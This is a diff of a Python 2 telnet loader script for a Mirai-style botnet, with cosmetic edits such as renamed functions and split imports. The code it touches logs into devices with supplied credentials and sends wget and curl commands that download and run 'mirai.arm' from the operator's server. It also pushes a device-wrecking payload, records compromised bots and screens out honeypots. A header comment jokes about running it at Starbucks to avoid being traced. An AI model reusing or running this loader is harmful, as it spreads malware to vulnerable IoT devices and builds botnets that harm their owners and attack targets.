@@ -7,17 +7,22 @@
 # Uses a keep-alive connection and can be traced!
 # In other words, don't do this at home. (Do it at Starbucks.)
 
-import sys, re, os, socket, time, select
+import sys
+import re
+import os
+import socket
+import time
+import select
 from threading import Thread
 
-yourserverip = "0.0.0.0" 
+yourserverip = "0.0.0.0"
 rekdevice = """paste update.sh/bins.sh here""".replace("\r", "").split("\n")
 
 global fh
 fh = open("bots.txt","a+")
 
 def chunkify(lst,n):
-    return [ lst[i::n] for i in xrange(n) ]
+    return [lst[i::n] for i in xrange(n)]
 
 running = 0
 
@@ -26,6 +31,7 @@ global tftp
 global wget
 global logins
 global echoed
+
 echoed = []
 tftp = 0
 wget = 0
@@ -34,7 +40,7 @@ logins = 0
 ran = 0
 
 # Print continuous list
-def printStatus():
+def print_status():
     global echo
     global tftp
     global wget
@@ -45,7 +51,7 @@ def printStatus():
         print "\033[32m[\033[31m+\033[32m] Logins: " + str(logins) + "     Ran:" + str(ran) + "  Echoes:" + str(echo) + " Wgets:" + str(wget) + " TFTPs:" + str(tftp) + "\033[37m"
 
 # Buffer sequence
-def readUntil(tn, advances, timeout=8):
+def read_until(tn, advances, timeout=8):
     buf = ''
     start_time = time.time()
     while time.time() - start_time < timeout:
@@ -56,7 +62,7 @@ def readUntil(tn, advances, timeout=8):
     return ""
 
 # Move on if socket times out
-def recvTimeout(sock, size, timeout=8):
+def recv_timeout(sock, size, timeout=8):
     sock.setblocking(0)
     ready = select.select([sock], [], [], timeout)
     if ready[0]:
@@ -82,6 +88,7 @@ def split_bytes(s, n):
         assert end > start
         yield s[start:end]
         start = end
+
 global badips
 global goodips
 badips=[]
@@ -92,13 +99,14 @@ def fileread():
     data=fh.read()
     fh.close()
     return data
-def clientHandler(c, addr):
+
+def client_handler(c, addr):
     global badips
     global goodips
     try:
         if addr[0] not in badips and addr[0] not in fileread():
             print addr[0] + ":" + str(addr[1]) + " has connected!"
-            request = recvTimeout(c, 8912)
+            request = recv_timeout(c, 8912)
             if "curl" not in request and "Wget" not in request:
                 if addr[0] not in fileread():
                     fh=open("honeypots.txt", "a")
@@ -159,19 +167,19 @@ def infect(ip, username, password):
         return
     try:
         hoho = ''
-        hoho += readUntil(tn, ":")
+        hoho += read_until(tn, ":")
         if ":" in hoho:
             tn.send(username + "\n")
             time.sleep(0.1)
         hoho = ''
-        hoho += readUntil(tn, ":")
+        hoho += read_until(tn, ":")
         if ":" in hoho:
             tn.send(password + "\n")
             time.sleep(0.8)
         else:
             pass
         prompt = ''
-        prompt += recvTimeout(tn, 8192)
+        prompt += recv_timeout(tn, 8192)
         if ">" in prompt and "ONT" not in prompt:
             success = True
         elif "#" in prompt or "$" in prompt or "@" in prompt or ">" in prompt:
@@ -194,7 +202,7 @@ def infect(ip, username, password):
             return
         time.sleep(1)
         try:
-            buf = recvTimeout(tn, 8192)
+            buf = recv_timeout(tn, 8192)
         except:
             tn.close()
             return
@@ -206,7 +214,7 @@ def infect(ip, username, password):
                 tn.send("wget http://" + yourserverip + "/mirai.arm &\r\n");
                 tn.send("curl http://" + yourserverip + ":8081/mirai.arm &\r\n");
                 time.sleep(3)
-                recvTimeout(tn, 8192)
+                recv_timeout(tn, 8192)
                 if ip in goodips:
                     tn.send(rekdevice)
                 tn.close()
@@ -251,6 +259,7 @@ def check(chunk, fh):
         except:
             pass
     running -= 1
+
 while 1:
     try:
         while running >= 256:
